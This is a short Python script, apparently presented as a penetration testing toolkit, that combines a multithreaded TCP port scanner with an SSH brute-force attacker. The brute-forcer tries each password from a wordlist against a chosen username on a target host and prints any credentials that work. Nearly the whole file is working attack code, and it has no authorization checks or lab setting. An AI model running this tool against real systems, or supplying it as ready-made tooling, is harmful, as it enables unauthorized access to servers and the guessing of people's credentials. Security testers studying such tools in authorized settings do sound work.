import socket
import concurrent.futures
import paramiko
import argparse

# === Port Scanner ===
def scan_port(target, port, open_ports):
    """Scans a single port on the target and stores results."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((target, port)) == 0:
                open_ports.append(port)
                print(f"[+] Port {port} is OPEN")
            else:
                print(f"[-] Port {port} is CLOSED")
    except Exception as e:
        print(f"[!] Error scanning port {port}: {e}")

def port_scanner(target, ports):
    """Scans multiple ports using multi-threading."""
    print(f"\n[🔍] Scanning {target} for open ports...")
    
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(scan_port, target, port, open_ports) for port in ports]
        concurrent.futures.wait(futures)

    print("\n[✅] Scan Complete!")
    if open_ports:
        print(f"[🎯] Open Ports: {', '.join(map(str, open_ports))}")
    else:
        print("[❌] No open ports found.")
    
    return open_ports  # Return open ports to decide next steps

# === SSH Brute-Forcer ===
def is_ssh_open(target, port=22):
    """Checks if SSH is open before brute-forcing."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            if s.connect_ex((target, port)) == 0:
                print(f"[✅] SSH is OPEN on {target}:{port}")
                return True
            else:
                print(f"[❌] SSH is CLOSED on {target}:{port}")
                return False
    except Exception as e:
        print(f"[!] Error checking SSH: {e}")
        return False

def ssh_bruteforce(target, username, password_file):
    """Attempts SSH brute-force attack using a password list."""
    
    if not is_ssh_open(target, 22):
        print("[❌] Cannot proceed: SSH is not open on target.")
        return
    
    print(f"\n[🚀] Starting SSH Brute Force on {target} with user '{username}'...")

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(password_file, "r") as f:
        for password in f:
            password = password.strip()
            try:
                ssh_client.connect(target, username=username, password=password, timeout=5)
                print(f"[🎯] SUCCESS: {username}:{password}")
                ssh_client.close()
                return
            except paramiko.AuthenticationException:
                print(f"[-] FAILED: {username}:{password}")
            except paramiko.SSHException:
                print("[!] SSH error: Connection dropped. Too many attempts?")
                break
            except socket.error:
                print("[❌] Unable to connect to target. SSH might be down.")
                break

    print("[🚀] Brute-force attack finished. No valid credentials found.")

# === CLI Menu ===
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Python Penetration Testing Toolkit")
    parser.add_argument("mode", choices=["scan", "brute-force"], help="Choose mode: scan or brute-force")
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("--ports", help="Comma-separated list of ports (e.g., 22,80,443)")
    parser.add_argument("--username", help="Username for SSH brute-force")
    parser.add_argument("--password_file", help="Path to password wordlist")

    args = parser.parse_args()
    
    if args.mode == "scan":
        if not args.ports:
            print("[❌] Please specify ports using --ports (e.g., 22,80,443)")
        else:
            port_list = [int(p) for p in args.ports.split(",")]
            port_scanner(args.target, port_list)

    elif args.mode == "brute-force":
        if not args.username or not args.password_file:
            print("[❌] Please provide --username and --password_file for brute-force mode.")
        else:
            ssh_bruteforce(args.target, args.username, args.password_file)
